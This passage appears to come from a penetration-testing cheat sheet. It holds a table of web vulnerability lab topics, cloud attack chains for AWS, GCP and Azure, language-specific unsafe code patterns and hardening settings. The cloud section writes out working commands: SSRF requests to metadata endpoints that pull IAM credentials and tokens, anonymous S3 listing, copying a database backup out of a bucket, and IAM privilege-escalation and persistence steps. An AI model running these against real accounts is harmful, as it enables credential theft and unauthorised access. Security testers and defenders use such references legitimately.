| **CSRF (SESS-05)** | CSRF where token validation depends on request method/token presence |
| **Clickjacking (CLNT-09)** | Basic clickjacking, pre-populated form, frame buster bypass |
| **DOM-based (CLNT-01)** | DOM XSS in various sinks, DOM clobbering |
| **CORS (CLNT-07)** | CORS with trusted null origin, insecure protocols |
| **XXE (INPV-07)** | Exploiting XXE using external entities, blind XXE |
| **SSRF (INPV-19)** | Basic SSRF, SSRF with filter bypass, blind SSRF |
| **Request Smuggling (INPV-15)** | CL.TE, TE.CL, TE.TE, HTTP/2 downgrade |
| **Command Injection (INPV-12)** | OS command injection, blind command injection |
| **SSTI (INPV-18)** | Basic SSTI, SSTI with sandbox escape, blind SSTI |
| **Path Traversal (ATHZ-01)** | File path traversal, traversal with absolute path bypass |
| **Access Control (ATHZ-02/03/04)** | Unprotected admin, IDOR, multi-step access control |
| **Authentication (ATHN-01~10)** | Password brute-force, MFA bypass, password reset poisoning |
| **WebSockets (CLNT-10)** | Manipulating WebSocket messages, CSWSH |
| **Cache Poisoning (Bug Bounty)** | Web cache poisoning, cache deception, cache key flaws |
| **Deserialization (Modern)** | Insecure deserialization (Java, PHP, Ruby) |
| **Information Disclosure (ERRH)** | Information disclosure in error messages, debug pages |
| **Business Logic (BUSL-01~09)** | Excessive trust, flawed enforcement, weak isolation |
| **Host Header (INPV-17)** | Host header auth bypass, password reset poisoning, routing SSRF |
| **OAuth (Modern)** | OAuth account hijacking via redirect_uri, state manipulation |
| **File Upload (BUSL-08/09)** | Remote code execution via web shell, polyglot upload |
| **JWT (Modern)** | JWT algorithm confusion, kid header path traversal |
| **Prototype Pollution (Modern)** | Client-side prototype pollution, server-side PP |
| **Race Conditions (BUSL-04)** | Limit overrun, multi-endpoint race, single-endpoint race |
| **NoSQL Injection (INPV-05.6)** | NoSQL injection, NoSQL operator injection |
| **API Testing (APIT-01)** | GraphQL introspection, GraphQL IDOR, batching brute-force |
| **Cache Deception (Modern)** | Web cache deception via path discrepancy |
| **LLM Attacks (Modern)** | Exploiting LLM APIs, indirect prompt injection |

---

## Part 26: Cloud Security Attack Chains

### AWS Attack Path
```
1. Recon: cloud_enum -k target.com → discover S3 buckets, cloudfront, EC2
2. S3 Enumeration: s3scanner, aws s3 ls --no-sign-request
3. S3 Exploitation: aws s3 cp s3://bucket/db_backup.sql ./
4. SSRF → IMDSv1: http://169.254.169.254/latest/meta-data/iam/security-credentials/
5. Credential Use: aws sts get-caller-identity --profile stolen
6. Privilege Escalation: Check IAM policies for *:* (admin), iam:CreateAccessKey, iam:UpdateAssumeRolePolicy
7. Persistence: Create new IAM user, create access key, assume role
8. Lateral Movement: enumerate EC2, RDS, Lambda, use SSM to run commands

### AWS Specific SSRF to Metadata
# IMDSv1 (most common target — no token required)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# IMDSv2 (requires PUT for token, harder to exploit via SSRF)
# Still possible with advanced SSRF (can set headers)
TOKEN=$(curl -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token:$TOKEN" http://169.254.169.254/latest/meta-data/

# ECS Task Metadata (containers)
http://169.254.170.2/v2/metadata/
http://169.254.170.2/v2/credentials/GUID
```

### GCP Attack Path
```
# Metadata endpoint
http://metadata.google.internal/computeMetadata/v1/
# Requires header: Metadata-Flavor: Google
# Can retrieve via SSRF if headers are controllable

http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id
# Use token with gcloud CLI: gcloud auth activate-service-account --key-file=creds.json
```

### Azure Attack Path
```
# Metadata endpoint
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Requires header: Metadata: true

http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# Use token to access Azure REST API
```

### Cloud Storage Enumeration
```bash
# AWS S3
aws s3 ls s3://bucket-name --no-sign-request
aws s3api get-bucket-acl --bucket bucket-name --no-sign-request
aws s3api get-bucket-policy --bucket bucket-name --no-sign-request

# GCP Storage
gsutil ls gs://bucket-name
curl https://storage.googleapis.com/bucket-name

# Azure Blob
curl https://storageaccount.blob.core.windows.net/container
# Check for public anonymous access
```

### Cloud Privilege Escalation Techniques
```
# AWS: Check IAM policies for dangerous permissions
aws iam list-attached-user-policies --user-name USER
aws iam get-policy-version --policy-arn POLICY_ARN --version-id v1

# Dangerous AWS IAM permissions:
iam:CreateAccessKey, iam:CreateLoginProfile, iam:UpdateAssumeRolePolicy
iam:AttachUserPolicy, iam:AttachRolePolicy, iam:PutUserPolicy
lambda:CreateFunction, lambda:UpdateFunctionCode, lambda:InvokeFunction
ec2:RunInstances (with privileged instance profile)
sts:AssumeRole (cross-account)

# Tools: Pacu (AWS exploitation), ScoutSuite/Prowler (auditing)
```

---

## Part 27: Programming Language Security Patterns

### Language-Specific Vulnerability Cheat Sheet

| Language | Top Web Vulns | Common Unsafe Patterns |
|----------|---------------|----------------------|
| **PHP** | LFI/RFI, Type Juggling, Deserialization, File Upload | `include($_GET['file'])`, `unserialize($_COOKIE)`, `==` vs `===` loose comparison |
| **Java** | Deserialization, XXE, EL Injection, SSTI (FreeMarker/Velocity) | `ObjectInputStream`, `DocumentBuilder` without XXE protection, Spring SpEL injection |
| **Python** | SSTI (Jinja2/Mako), Pickle Deserialization, Command Injection | `render_template_string(user_input)`, `pickle.loads(data)`, `os.system()` with user input |
| **Node.js/JS** | Prototype Pollution, SSTI (EJS/Pug/Nunjucks), RCE via eval/child_process | `_.merge()` on user objects, `eval(user_input)`, `child_process.exec()` with string concat |
| **Ruby** | Deserialization (Marshal/YAML), SSTI (ERB), Command Injection | `Marshal.load()`, `YAML.load()`, `eval()`, backtick execution with user input |
| **Go** | SSTI (html/template), SQL Injection, Path Traversal | Template injection when using text/template instead of html/template, raw SQL concatenation |
| **C#/.NET** | Deserialization (BinaryFormatter/JSON.NET), XXE, SQL Injection | `BinaryFormatter.Deserialize()`, `XmlDocument` without safe settings, raw SQL with `+` concat |
| **Rust** | Path Traversal, Injection (rare due to type system) | Unsafe raw SQL, command execution with user input, path join without canonicalization |

### Language-Specific Security Headers/Configurations
```
# PHP
expose_php = Off
display_errors = Off (production)
allow_url_include = Off
disable_functions = exec,shell_exec,system,passthru,popen,proc_open

# Java/Tomcat
Server header removal: server=""
Error page configuration to hide stack traces
XML parser configuration: disable external entities

# Python
DEBUG = False (Django/Flask production)
TEMPLATE_DEBUG = False
SECURE_SSL_REDIRECT = True (Django)
SESSION_COOKIE_SECURE = True
SESSION_COOKIE_HTTPONLY = True
CSRF_COOKIE_SECURE = True

# Node.js
helmet() middleware
express-rate-limit for brute-force protection
express-mongo-sanitize for NoSQL injection
```

```
